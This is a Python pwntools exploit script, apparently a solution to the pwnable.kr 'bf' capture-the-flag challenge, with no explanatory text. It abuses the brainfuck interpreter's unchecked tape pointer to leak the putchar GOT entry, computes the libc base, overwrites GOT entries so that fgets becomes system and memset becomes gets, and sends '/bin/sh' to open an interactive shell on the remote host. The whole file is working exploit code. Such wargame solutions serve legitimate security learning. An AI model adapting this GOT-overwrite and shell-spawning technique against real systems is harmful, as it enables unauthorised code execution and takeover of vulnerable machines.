from pwn import *
context(os='linux', arch='i386', log_level='debug')

DEBUG = 0
if DEBUG:
    p = process('./bf')
    libc = ELF('/usr/lib32/libc.so.6')
else:
    p = remote('pwnable.kr', 9001)
    libc = ELF('./bf_libc.so')

def main():
    #pwnlib.gdb.attach(p)
    p.recvuntil(']')

    put_char_offset = 0x8048a0a0 - 0x8048a030 # relative address from tape to got table
    payload = '.' # Output the position pointed to by the pointer
    payload += '<' *  put_char_offset # pointer put_char_offset minus 1
    payload += '.>' * 4 # Output pointer position plus 4 position
    payload += '<,' * 4  # write put_char input content to putchar position
    payload += '<' * 4 # Point to the location of memset
    payload += ',>' * 4  # write memset Enter the content to the memset position and return to Putchar
    payload += '<' * (0x2c - 0x10 + 4) # The pointer points to the location of fget
    payload += ',>' * 4  # write fgets Pointer position +4 after input to fget
    payload += '.' * (0x400 - len(payload) - 1)
    p.send(payload)
    p.recv()
    if DEBUG:
        leak = p.recv()[1:]
    else:
        p.recv()
        leak = p.recv()

    log.info('get:' + str(len(leak)))
    log.info('leak:' + hex(u32(leak)))

    putchar_pos = u32(leak)
    libc_base = putchar_pos - libc.symbols['putchar']
    system_addr = libc_base + libc.symbols['system']
    gets_addr = libc_base + libc.symbols['gets']
    main_addr = 0x08048671

    log.info("libc base at:" + hex(libc_base))

    packed_gadget_pos = p32(0x08048671)

    # write put char
    for x in (packed_gadget_pos[::-1]):
        p.send(x)

    # write memset
    for x in p32(gets_addr):
        p.send(x)
    #write fgets
    for x in p32(system_addr):
        p.send(x)

    p.recvuntil(']')
    payload = '/bin/sh\x00'
    p.send(payload)

    p.interactive()




if __name__ == '__main__':
    main()
